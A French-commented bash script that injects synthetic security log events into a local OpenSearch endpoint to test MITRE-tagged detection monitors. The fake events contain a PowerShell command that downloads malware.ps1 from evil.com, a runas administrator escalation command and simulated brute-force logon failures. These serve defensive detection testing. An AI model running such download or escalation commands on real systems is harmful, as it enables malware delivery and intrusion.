set -euo pipefail

# ---- CONFIG ----
URL="http://localhost:2021/"
NOW=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

# Couleurs
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
RESET="\e[0m"

# ---- Vérifications ----
if ! command -v curl &> /dev/null; then
    echo -e "${RED}Erreur: curl n'est pas installé${RESET}"
    exit 1
fi

# ---- Fonctions utilitaires ----
send_logs() {
    local payload="$1"
    local label="$2"
    echo -e "${BLUE}📤 Envoi des logs: ${label}${RESET}"
    if curl -s -X POST "$URL" -H "Content-Type: application/json" -d "$payload" --max-time 10 --fail > /dev/null; then
        echo -e "${GREEN}${label} envoyés avec succès${RESET}"
    else
        echo -e "${RED}Échec de l’envoi: $label${RESET}"
        return 1
    fi
}

# ---- Payloads conformes aux monitors ----

# 1. PowerShell SUSPECT (déclenche tag mitre_powershell)
POWERSHELL_SUSPECTS="[{
  \"@timestamp\": \"$NOW\",
  \"tags\": \"mitre_powershell\",
  \"ps_command\": \"Invoke-WebRequest -Uri http://evil.com/malware.ps1\",
  \"user\": \"jsmith\",
  \"host\": \"host01\"
}]"

# 2. Privilege Escalation (déclenche tag mitre_privilege_escalation)
PRIV_ESCALATION="[{
  \"@timestamp\": \"$NOW\",
  \"tags\": \"mitre_privilege_escalation\",
  \"user\": \"baduser\",
  \"command\": \"runas /user:administrator cmd\"
}]"

# 3. Processus Suspect (déclenche tag mitre_process_suspect)
PROCESS_SUSPECT="[{
  \"@timestamp\": \"$NOW\",
  \"tags\": \"mitre_process_suspect\",
  \"new_process\": \"suspicious.exe\",
  \"command\": \"suspicious.exe --malicious\"
}]"

# 4. Brute Force (déclenche "failed to log on" dans log)
BRUTE_FORCE="["
for i in {1..6}; do
    BRUTE_FORCE+="{\"@timestamp\":\"$NOW\",\"log\":\"failed to log on\"}"
    [[ $i -lt 6 ]] && BRUTE_FORCE+=","
done
BRUTE_FORCE+="]"

# ---- Injection ----
echo -e "${YELLOW} Début de l'injection des logs de test...${RESET}"
send_logs "$POWERSHELL_SUSPECTS" "PowerShell suspects"
send_logs "$PRIV_ESCALATION" "Privilege Escalation"
send_logs "$PROCESS_SUSPECT" "Processus suspect"
send_logs "$BRUTE_FORCE" "Brute force (6 events)"

echo -e "\n${GREEN} Tous les événements ont été injectés pour déclencher tes monitors !${RESET}"

# ---- Résumé ----
echo -e "${YELLOW}\nRésumé:${RESET}"
echo "  - PowerShell suspects (mitre_powershell): 1"
echo "  - Privilege escalation (mitre_privilege_escalation): 1"
echo "  - Process suspect (mitre_process_suspect): 1"
echo "  - Brute force (failed to log on): 6"
echo -e "${GREEN}Injection terminée. Vérifie les alertes dans OpenSearch Dashboard!${RESET}"
